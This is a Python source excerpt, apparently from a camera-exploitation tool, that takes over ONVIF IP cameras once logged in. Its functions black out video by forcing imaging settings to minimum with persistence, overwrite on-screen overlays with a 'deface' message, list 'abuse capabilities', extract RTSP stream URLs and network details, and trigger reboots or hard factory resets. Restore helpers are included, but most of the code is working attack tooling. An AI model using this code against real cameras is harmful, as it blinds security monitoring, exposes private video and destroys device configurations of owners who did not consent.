def _extract_option_min(options: Any, field_name: str) -> float | int | None:
    """
    Extract the minimum supported value for a numeric imaging setting.
    """
    option = getattr(options, field_name, None)
    if option is None:
        return None

    minimum = getattr(option, "Min", None)
    return _coerce_numeric(minimum)


def _prepare_imaging_blackout(
    settings: Any,
    options: Any,
) -> dict[str, float | int]:
    """
    Update imaging settings in place to darken the stream as much as possible.
    """
    applied_fields: dict[str, float | int] = {}

    for field_name in ("Brightness", "ColorSaturation", "Contrast"):
        minimum = _extract_option_min(options, field_name)
        if minimum is None:
            continue

        setattr(settings, field_name, minimum)
        applied_fields[field_name] = minimum

    return applied_fields


def get_imaging_deface_support(client: ONVIFClient) -> Dict[str, Any]:
    """
    Return whether the target appears to support stream darkening through ONVIF imaging.
    """
    service = _imaging_service(client)
    if service is None:
        return {
            "ok": False,
            "error": "No ONVIF imaging service was exposed",
        }

    tokens = _video_source_tokens(client)
    if not tokens:
        return {
            "ok": False,
            "error": "No usable video source token was found",
        }

    last_reason = None
    last_traceback = None

    for token in tokens:
        try:
            settings = service.GetImagingSettings(VideoSourceToken=token)
            options = service.GetOptions(VideoSourceToken=token)
        except Exception:
            last_reason = "The device rejected ONVIF imaging capability queries"
            last_traceback = traceback.format_exc().rstrip()
            continue

        if _prepare_imaging_blackout(settings, options):
            return {
                "ok": True,
                "token": token,
            }

        last_reason = (
            "The device exposes ONVIF imaging, but no suitable darkening controls were found"
        )

    return {
        "ok": False,
        "error": last_reason or "Stream darkening is not available on this target",
        "traceback": last_traceback,
    }


def get_deface_support(client: ONVIFClient) -> Dict[str, Any]:
    """
    Return the overall ONVIF deface support state.
    """
    imaging = get_imaging_deface_support(client)
    text = supports_osd_deface(client)
    imaging_ok = bool(imaging.get("ok"))

    status = "No"
    if imaging_ok and text:
        status = "Yes"
    elif imaging_ok or text:
        status = "Partial"

    return {
        "status": status,
        "darkening": imaging_ok,
        "text": text,
        "imaging_error": imaging.get("error"),
        "imaging_traceback": imaging.get("traceback"),
    }


def build_deface_restore_profile(
    client: ONVIFClient,
    message: str,
) -> dict[str, Any]:
    """
    Capture the ONVIF state needed to restore a previous deface attempt.
    """
    profile: dict[str, Any] = {
        "message": message,
        "saved_at": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "profiles": get_profiles(client),
        "text_layers": _capture_osd_restore_payloads(client),
    }

    imaging_support = get_imaging_deface_support(client)
    if imaging_support.get("ok"):
        token = str(imaging_support.get("token") or "")
        service = _imaging_service(client)
        if service is not None and token:
            try:
                settings = service.GetImagingSettings(VideoSourceToken=token)
                options = service.GetOptions(VideoSourceToken=token)
            except Exception:
                settings = None
                options = None

            if settings is not None and options is not None:
                imaging_fields = {}
                for field_name in ("Brightness", "ColorSaturation", "Contrast"):
                    minimum = _extract_option_min(options, field_name)
                    if minimum is None:
                        continue

                    current_value = _coerce_numeric(getattr(settings, field_name, None))
                    if current_value is None:
                        continue

                    imaging_fields[field_name] = current_value

                if imaging_fields:
                    profile["imaging"] = {
                        "token": token,
                        "settings": imaging_fields,
                    }

    return profile


def supports_factory_reset(client: ONVIFClient) -> bool:
    """
    Best-effort check for factory reset method availability without invoking it.
    """
    try:
        device = client.devicemgmt()
        device.GetServiceCapabilities()
    except Exception:
        return False

    try:
        return callable(getattr(device.operator.service, "SetSystemFactoryDefault"))
    except Exception:
        return False


def deface_osd_entries(
    client: ONVIFClient,
    message: str,
) -> List[Dict[str, str]]:
    """
    Overwrite only existing ONVIF Text/Plain OSD entries.

    Returns one result dictionary per OSD entry that was attempted.
    """
    results: List[Dict[str, str]] = []

    for service, osd in _iter_osd_entries(client):
        token = _extract_osd_entry_token(osd)
        osd_type = str(getattr(osd, "Type", None) or "")
        text_type = _extract_osd_text_type(osd)

        if osd_type != "Text" or text_type != "Plain":
            continue

        try:
            payload = _build_defaced_osd_payload(osd, message)
            service.SetOSD(OSD=payload)

            results.append({
                "token": token or "(empty)",
                "status": "updated",
            })
        except Exception:
            results.append({
                "token": token or "(empty)",
                "status": "failed",
                "error": "The device rejected the ONVIF OSD update request",
            })

    return results


def apply_imaging_blackout(
    client: ONVIFClient,
) -> Dict[str, Any]:
    """
    Try darkening the stream through ONVIF imaging settings.
    """
    service = _imaging_service(client)
    if service is None:
        return {
            "ok": False,
            "error": "No ONVIF imaging service was exposed",
        }

    last_reason = None
    last_traceback = None

    for token in _video_source_tokens(client):
        try:
            settings = service.GetImagingSettings(VideoSourceToken=token)
            options = service.GetOptions(VideoSourceToken=token)
        except Exception:
            last_reason = "The device rejected ONVIF imaging capability queries"
            last_traceback = traceback.format_exc().rstrip()
            continue

        applied_fields = _prepare_imaging_blackout(settings, options)
        if not applied_fields:
            last_reason = "No suitable darkening controls were found for this stream"
            continue

        try:
            try:
                service.SetImagingSettings(
                    VideoSourceToken=token,
                    ImagingSettings=settings,
                    ForcePersistence=True,
                )
            except Exception:
                service.SetImagingSettings(
                    VideoSourceToken=token,
                    ImagingSettings=settings,
                )

            return {
                "ok": True,
                "token": token,
                "applied_fields": applied_fields,
            }
        except Exception:
            last_reason = "The device rejected the ONVIF imaging update request"
            last_traceback = traceback.format_exc().rstrip()
            continue

    return {
        "ok": False,
        "error": last_reason or "The device rejected the ONVIF imaging update request",
        "traceback": last_traceback,
    }


def verify_imaging_blackout(
    client: ONVIFClient,
    token: str,
    expected_fields: dict[str, float | int],
) -> bool:
    """
    Verify that the requested imaging settings are still visible through ONVIF.
    """
    if not token or not expected_fields:
        return False

    service = _imaging_service(client)
    if service is None:
        return False

    for _ in range(3):
        try:
            settings = service.GetImagingSettings(VideoSourceToken=token)
        except Exception:
            settings = None

        if settings is not None:
            matched = True
            for field_name, expected_value in expected_fields.items():
                actual_value = _coerce_numeric(getattr(settings, field_name, None))
                if actual_value is None:
                    matched = False
                    break

                if abs(float(actual_value) - float(expected_value)) > 0.01:
                    matched = False
                    break

            if matched:
                return True

        time.sleep(0.35)

    return False


def restore_imaging_profile(
    client: ONVIFClient,
    profile: dict[str, Any],
) -> bool:
    """
    Restore previously saved imaging settings.
    """
    token = str(profile.get("token") or "")
    expected_fields = profile.get("settings") or {}
    if not token or not expected_fields:
        return False

    service = _imaging_service(client)
    if service is None:
        return False

    try:
        settings = service.GetImagingSettings(VideoSourceToken=token)
    except Exception:
        return False

    for field_name, expected_value in expected_fields.items():
        setattr(settings, field_name, expected_value)

    try:
        try:
            service.SetImagingSettings(
                VideoSourceToken=token,
                ImagingSettings=settings,
                ForcePersistence=True,
            )
        except Exception:
            service.SetImagingSettings(
                VideoSourceToken=token,
                ImagingSettings=settings,
            )
    except Exception:
        return False

    return verify_imaging_blackout(client, token, expected_fields)


def verify_defaced_osd_entries(
    client: ONVIFClient,
    tokens: list[str],
    message: str,
) -> List[Dict[str, str]]:
    """
    Verify that updated ONVIF OSD entries still expose Text/Plain with the requested message.
    """
    results: List[Dict[str, str]] = []

    for token in [token for token in tokens if token]:
        refreshed = None

        for _ in range(3):
            refreshed = _find_osd_entry_by_token(client, token)
            if refreshed is not None:
                break
            time.sleep(0.35)

        if refreshed is None:
            results.append({
                "token": token,
                "status": "unconfirmed",
            })
            continue

        refreshed_type = _extract_osd_text_type(refreshed)
        refreshed_text = _extract_osd_plain_text(refreshed)

        if refreshed_type == "Plain" and refreshed_text == message:
            results.append({
                "token": token,
                "status": "verified",
            })
        elif (
            refreshed_type == "Plain"
            and refreshed_text
            and message.startswith(refreshed_text)
        ):
            results.append({
                "token": token,
                "status": "truncated",
                "visible_text": refreshed_text,
            })
        else:
            results.append({
                "token": token,
                "status": "failed",
            })

    return results


def restore_osd_entries(
    client: ONVIFClient,
    payloads: list[dict[str, Any]],
) -> List[Dict[str, str]]:
    """
    Restore previously saved OSD entries from serialized SetOSD payloads.
    """
    results: List[Dict[str, str]] = []
    if not payloads:
        return results

    services = _media_service_candidates(client)
    if not services:
        return results

    for payload in payloads:
        token = str(payload.get("token") or "")
        if not token:
            continue

        updated = False
        for service in services:
            try:
                service.SetOSD(OSD=payload)
                updated = True
                break
            except Exception:
                continue

        if not updated:
            results.append({
                "token": token,
                "status": "failed",
            })
            continue

        refreshed = None
        for _ in range(3):
            refreshed = _find_osd_entry_by_token(client, token)
            if refreshed is not None:
                break
            time.sleep(0.35)

        if refreshed is None:
            results.append({
                "token": token,
                "status": "unconfirmed",
            })
            continue

        if _restore_osd_payload_matches(payload, refreshed):
            results.append({
                "token": token,
                "status": "restored",
            })
        else:
            results.append({
                "token": token,
                "status": "failed",
            })

    return results


def get_abuse_capabilities(client: ONVIFClient) -> Dict[str, str]:
    """
    Return useful post-auth ONVIF capabilities in a printable form.
    """
    deface_support = get_deface_support(client)
    return {
        "Supports ONVIF Deface": str(deface_support["status"]),
        "PTZ Camera Movement Available": "Yes" if supports_ptz(client) else "No",
        "Factory Reset Method Available": "Yes" if supports_factory_reset(client) else "No",
    }


def get_rtsp_streams(client: ONVIFClient) -> List[str]:
    """
    Extract RTSP stream URIs via ONVIF Media service.

    Returns empty list if not authorized or not supported.
    """
    uris: List[str] = []

    try:
        media = client.media()
        profiles = media.GetProfiles()
    except Exception:
        return uris

    for profile in profiles:
        try:
            token = profile.token
        except AttributeError:
            continue

        try:
            uri_resp = media.GetStreamUri(
                StreamSetup={
                    "Stream": "RTP-Unicast",
                    "Transport": {"Protocol": "RTSP"},
                },
                ProfileToken=token,
            )

            uri = getattr(uri_resp, "Uri", "")
            if uri:
                uris.append(uri)

        except Exception:
            continue

    return uris

def get_network_interfaces(client: ONVIFClient) -> List[Dict[str, Any]]:
    """
    Extract network interface information via ONVIF Device service.

    Returns:
        [
            {
                "name": str,
                "mac": str,
                "ipv4": [ "ip/prefix", ... ],
                "type": "ethernet" | "wifi" | "unknown",
            }
        ]
    """
    interfaces: List[Dict[str, Any]] = []

    try:
        device = client.devicemgmt()
        raw_ifaces = device.GetNetworkInterfaces()
    except Exception:
        return interfaces

    for iface in raw_ifaces:
        # Interface info
        name = ""
        mac = ""

        try:
            if iface.Info:
                name = getattr(iface.Info, "Name", "")
                mac = getattr(iface.Info, "HwAddress", "")
        except Exception:
            pass

        # IPv4 addresses
        ipv4_addrs: List[str] = []

        try:
            ipv4 = iface.IPv4
            if ipv4 and ipv4.Config:
                cfg = ipv4.Config

                # Static addresses
                if cfg.Manual:
                    for entry in cfg.Manual:
                        addr = getattr(entry, "Address", None)
                        prefix = getattr(entry, "PrefixLength", None)
                        if addr and prefix is not None:
                            ipv4_addrs.append(f"{addr}/{prefix}")

                # DHCP address
                if cfg.FromDHCP:
                    addr = getattr(cfg.FromDHCP, "Address", None)
                    prefix = getattr(cfg.FromDHCP, "PrefixLength", None)
                    if addr and prefix is not None:
                        ipv4_addrs.append(f"{addr}/{prefix}")
        except Exception:
            pass

        # Interface type heuristic
        iface_type = "unknown"
        if name.startswith("wl"):
            iface_type = "wifi"
        elif name.startswith("eth"):
            iface_type = "ethernet"

        interfaces.append({
            "name": name,
            "mac": mac,
            "ipv4": ",".join(ipv4_addrs),
            "type": iface_type,
        })

    return interfaces

def system_reboot(client: ONVIFClient) -> bool:
    """
    Request a system reboot via the ONVIF Device service.

    Returns:
        True if the reboot request was accepted, False otherwise.
    """
    try:
        device = client.devicemgmt()
        device.SystemReboot()
        return True
    except Exception:
        return False


def system_factory_reset(
    client: ONVIFClient,
    mode: str = "Hard",
) -> bool:
    """
    Request a factory reset via the ONVIF Device service.

    Returns:
        True if the reset request was accepted, False otherwise.
    """
    try:
        device = client.devicemgmt()
        device.SetSystemFactoryDefault(mode)
        return True
    except Exception:
        return False


def open_interactive_shell(
    client: ONVIFClient,
    *,
    host: str,
    port: int,
    username: str,
    password: str,
) -> bool:
    """
    Launch the interactive onvif-python shell for the given target.
    """
    shell_args = SimpleNamespace(
        host=host,
        port=port,
        username=username,
        password=password,
        https=False,
        no_verify_ssl=False,
        timeout=10,
        debug=False,
        no_patch=False,
        wsdl=None,
        cache="all",
        health_check_interval=10,
    )

    shell = PwneyeInteractiveShell(client, shell_args)
    shell.intro = (
        "\n"
        f"This feature is powered by "
        f"{colorize('https://github.com/nirsimetri/onvif-python', 'white')} "
        f"({colorize('leave it a ⭐!', 'yellow')})\n"
        f"Use {_emphasize_shell_text('TAB')} for completion and {_emphasize_shell_text('help')} for commands.\n"
    )
    shell.run()
    return True
